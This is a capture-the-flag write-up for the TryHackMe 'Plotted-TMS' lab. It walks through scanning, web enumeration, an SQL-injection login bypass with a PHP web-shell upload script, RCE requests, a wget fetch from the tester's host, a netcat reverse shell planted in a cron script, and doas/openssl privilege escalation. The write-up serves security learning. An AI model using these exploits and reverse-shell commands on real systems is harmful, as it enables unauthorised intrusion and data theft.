
[TryHackMe Link](https://tryhackme.com/room/plottedtms){ .md-button }

!!! example "Description"

    <p id="desc" style="font-size:15px"></p>

## <b>Scanning</b>

* Assigned IP address: &nbsp; <b id="ip" style="color:purple"></b>
  
* Open Ports: 

| <p style="font-size:14px; color: black">PORT</p>      | <p style="font-size:14px; color: black">SERVICE</p> |  <p style="font-size:14px; color: black">DESCRIPTION                          |
| :---------: | :---------: | :----------------------------------: |
| <p id="p1" style="font-size:14px; color: purple"></p>      | <p id="s1" style="font-size:14px; color: purple"></p>  |<p id="d1" style="font-size:14px; color: purple"></p>   |
| <p id="p2" style="font-size:14px;  color: purple"></p>     | <p id="s2" style="font-size:14px; color: purple"></p>  |<p id="d2" style="font-size:14px; color: purple"></p> |
| <p id="p3" style="font-size:14px;  color: purple"></p>     | <p id="s3" style="font-size:14px; color: purple"></p>  |<p id="d3" style="font-size:14px; color: purple"></p> |


* Nmap Report:
```s linenums="1" hl_lines="6 11 14"
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-26 09:29 EST
Nmap scan report for 10.10.72.232
Host is up (0.17s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a36a9cb11260b272130984cc3873444f (RSA)
|   256 b93f8400f4d1fdc8e78d98033874a14d (ECDSA)
|_  256 d08651606946b2e139439097a6af9693 (ED25519)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.45 seconds
```

## <b>Enumeration</b>

In order to gain access to the system, I began by opening port 80 and was greeted with the Apache default page. 

<img id="image1" />

My next step was to try and enumerate hidden folders through the use of **`dirsearch.py`**. This led me to discover that the **/admin**, **/shadow**, and **/passwd** directories were available. However, this was a trap which I unfortunately fell for.

Afterwards, I attempted to use **`enum4linux`** to enumerate the so-called **"SMB"** protocol at port 445. It wasn't until later that I realized another http server was running on that port, which again was a trap that I fell for.

My next attempt involved enumerating hidden folders on **10.10.72.232:445**, which led me to discover the **`/management/`** folder that hosted a Traffic Offense Management system. 

<img id="image2" />

After conducting some online research, I found an exploit that could be allowed for Remote Code Execution (RCE). Also, I located the exploit code at searchsploit

<img id="image3" />

## <b>Initial Access</b>

I successfully uploaded a shell to the **/uploads** folder using the following code.

```python linenums="1"
#!/usr/bin/env python2
import requests
import time
from bs4 import BeautifulSoup

print ("\nExample: http://example.com\n")

url = raw_input("Url: ")
payload_name = "evil.php"
payload_file = "<?php if(isset($_GET['cmd'])){ echo '<pre>'; $cmd = ($_GET['cmd']); system($cmd); echo '</pre>'; die; } ?>"

if url.startswith(('http://', 'https://')):
    print "Check Url ...\n"
else:
    print "\n[?] Check Adress\n"
    url = "http://" + url

try:
    response = requests.get(url)
except requests.ConnectionError as exception:
    print("[-] Address not reachable")
    sys.exit(1)

session = requests.session()

request_url = url + "/classes/Login.php?f=login"
post_data = {"username": "'' OR 1=1-- '", "password": "'' OR 1=1-- '"}
bypass_user = session.post(request_url, data=post_data)


if bypass_user.text == '{"status":"success"}':
    print ("[+] Bypass Login\n")
    cookies = session.cookies.get_dict()
    req = session.get(url + "/admin/?page=user")
    parser = BeautifulSoup(req.text, 'html.parser')
    userid = parser.find('input', {'name':'id'}).get("value")
    firstname = parser.find('input', {'id':'firstname'}).get("value")
    lastname = parser.find('input', {'id':'lastname'}).get("value")
    username = parser.find('input', {'id':'username'}).get("value")

    request_url = url + "/classes/Users.php?f=save"
    headers = {"sec-ch-ua": "\";Not A Brand\";v=\"99\", \"Chromium\";v=\"88\"", "Accept": "*/*", "X-Requested-With": "XMLHttpRequest", "sec-ch-ua-mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryxGKa5dhQCRwOodsq", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
    data = "------WebKitFormBoundaryxGKa5dhQCRwOodsq\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n"+ userid +"\r\n------WebKitFormBoundaryxGKa5dhQCRwOodsq\r\nContent-Disposition: form-data; name=\"firstname\"\r\n\r\n"+ firstname +"\r\n------WebKitFormBoundaryxGKa5dhQCRwOodsq\r\nContent-Disposition: form-data; name=\"lastname\"\r\n\r\n"+ lastname +"\r\n------WebKitFormBoundaryxGKa5dhQCRwOodsq\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n"+ username +"\r\n------WebKitFormBoundaryxGKa5dhQCRwOodsq\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n\r\n------WebKitFormBoundaryxGKa5dhQCRwOodsq\r\nContent-Disposition: form-data; name=\"img\"; filename=\""+ payload_name +"\"\r\nContent-Type: application/x-php\r\n\r\n" + payload_file +"\n\r\n------WebKitFormBoundaryxGKa5dhQCRwOodsq--\r\n"
    upload = session.post(request_url, headers=headers, cookies=cookies, data=data)
    time.sleep(2)

    if upload.text == "1":
        print ("[+] Upload Shell\n")
        time.sleep(2)
        req = session.get(url + "/admin/?page=user")
        parser = BeautifulSoup(req.text, 'html.parser')
        find_shell = parser.find('img', {'id':'cimg'})
        print ("[+] Exploit Done!\n")

        while True:
            cmd = raw_input("$ ")
            headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36'}
            request = requests.post(find_shell.get("src") + "?cmd=" + cmd, data={'key':'value'}, headers=headers)
            print request.text.replace("<pre>" ,"").replace("</pre>", "")
            time.sleep(1)

    elif upload.text == "2":
        print ("[-] Try the manual method")
        request_url = url + "/classes/Login.php?f=logout"
        cookies = session.cookies.get_dict()
        headers = {"sec-ch-ua": "\";Not A Brand\";v=\"99\", \"Chromium\";v=\"88\"", "sec-ch-ua-mobile": "?0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
        session.get(request_url, headers=headers, cookies=cookies)
    else:
        print("[!]An unknown error")

else:
    print ("[-] Failed to bypass login panel")
```

There were some glitch on the code, but the upload was successful. I quickly checked the browser and I could see

<img id="image4" />

I proceeded to execute commands via **cmd** argument in order to retrieve the **/etc/passwd** content. 

!!! bug "RCE"
    ```http
    GET /management/uploads/1677425460_evil.php?cmd=/etc/passwd HTTP/1.1
    ```
```s linenums="1" hl_lines="33 36"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
plot_admin:x:1001:1001:,,,:/home/plot_admin:/bin/bash
```

The command revealed the names of the users **plot_admin** and **ubuntu**.

To further penetrate the system, I set out to get a stabilized reverse shell. I hosted a reverse shell from my side and accessed it through the cmd argument. 

!!! bug "RCE"
    ```http
    GET /management/uploads/1677425460_evil.php?cmd=wget+http%3a//10.17.3.217%3a8000/shell.php HTTP/1.1
    ```
    ```http
    GET /management/uploads/1677425460_evil.php?cmd=chmod+777+shell.php HTTP/1.1
    ```

Upon accessing <a>http://10.10.72.232:445/management/uploads/shell.php</a>, 

I successfully gained a reverse shell for the **`www-data`** user.

## <b>Privilege Escalation</b>

### <b>Gaining User access (plot_admin)</b>

Next, I sent a linpeas script to the system and executed it and these were the following results:

* Sudo version 1.8.31
* CVE-2022-2588
* \* *     * * *   plot_admin /var/www/scripts/backup.sh
* 127.0.0.1:3306
* 127.0.0.1:33060
* /swap.img

It revealed that there was a script running in a cron job every minute. I believed this to be the door for privilege escalation.

!!! warning "Something Seemed off"
    <span>The **`backup.sh`** file was owned by **plot_admin**, while **`/var/www/scripts/`** was owned by **www-data** (the current user). </span>
    
This was a  security risk as anyone could delete the content from the folder and recreate it. So, I took this advantage to give permissions to **user.txt** and **tms_backups** in the **`/home/plot_admin`** folder and accessed the first flag.

<img id="image5" />

### <b>Gaining Root access</b>

From there, I escalated my privilege to plot_admin by overwriting the backup.sh with a reverse shell. 

```s
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.17.3.217 5432 >/tmp/f  
```

Running **linpeas.sh** again, I found the following:

```s linenums="1" hl_lines="10"
-rwsr-xr-x   1 root     root               68208 Jul 14  2021 /usr/bin/passwd
-rwsr-xr-x   1 root     root              166056 Jan 19  2021 /usr/bin/sudo
-rwsr-xr-x   1 root     root               88464 Jul 14  2021 /usr/bin/gpasswd
-rwsr-xr-x   1 root     root               55528 Jul 21  2020 /usr/bin/mount
-rwsr-xr-x   1 root     root               67816 Jul 21  2020 /usr/bin/su
-rwsr-xr-x   1 root     root               85064 Jul 14  2021 /usr/bin/chfn
-rwsr-xr-x   1 root     root               39144 Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x   1 root     root               53040 Jul 14  2021 /usr/bin/chsh
-rwsr-xr-x   1 root     root               39144 Jul 21  2020 /usr/bin/umount
-rwsr-xr-x   1 root     root               39008 Feb  5  2021 /usr/bin/doas
-rwsr-xr-x   1 root     root               44784 Jul 14  2021 /usr/bin/newgrp
-rwsr-xr-x   1 root     root               19040 Jun  3  2021 /usr/libexec/polkit-agent-helper-1
-rwsr-xr-x   1 root     root              130408 Mar 26  2021 /usr/lib/snapd/snap-confine
-rwsr-xr-x   1 root     root               14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x   1 root     root              473576 Jul 23  2021 /usr/lib/openssh/ssh-keysign
```

<img id="image6" />

!!! abstract "Definition"
    <span>The doas command (short for "do as") is a linux utility that allows a user to execute a command with the privileges of another user, typically the root user.</span>

Leveraging the openssl command alongside the doas command in [gtfobins](https://gtfobins.github.io/gtfobins/openssl/#file-read), I was able to read files and ultimately obtain the second flag.

<img id="image7" />

<script>

// JSON object
const data = {
    "desc": "Everything here is plotted! Tip: Enumeration is key!",
    "ip":  "10.10.72.232",
    "ports": "22/tcp,ssh,OpenSSH 8.2p1 Ubuntu 4ubuntu0.3;80/tcp,http,Apache httpd 2.4.41;445/tcp,http,Apache httpd 2.4.41",
    "difficulty":"easy",
    "id": "7"
}


function updateHTML() {

    const keys = Object.keys(data);
    const values = Object.values(data);

    for(var z=0; z < keys.length; z++){

        if(keys[z] === "ports"){
            const ports = data.ports.split(';');
            for(var i = 0; i < ports.length; i++){
                document.getElementById("p"+(i+1)).innerHTML = ports[i].split(',')[0].toUpperCase();
                document.getElementById("s"+(i+1)).innerHTML = ports[i].split(',')[1].toUpperCase();
                document.getElementById("d"+(i+1)).innerHTML = ports[i].split(',')[2];
            }
        }
        else{
            try{
            document.getElementById(keys[z]).innerHTML = values[z];
            }
            catch(error){
                console.log(values[z]);
            }
        }
    }

    // replace the values with your specific filenames and number of images and img tags
    const numImgTags = document.getElementsByTagName('img').length;

    for (let i = 1; i <= numImgTags; i++) {
    const imgTag = document.getElementById('image' + i);
        if (imgTag) {
            imgTag.src = '../images/'+data.difficulty[0]+data.id+'-image' + i + '.png';
        }
    }


}

updateHTML();
</script>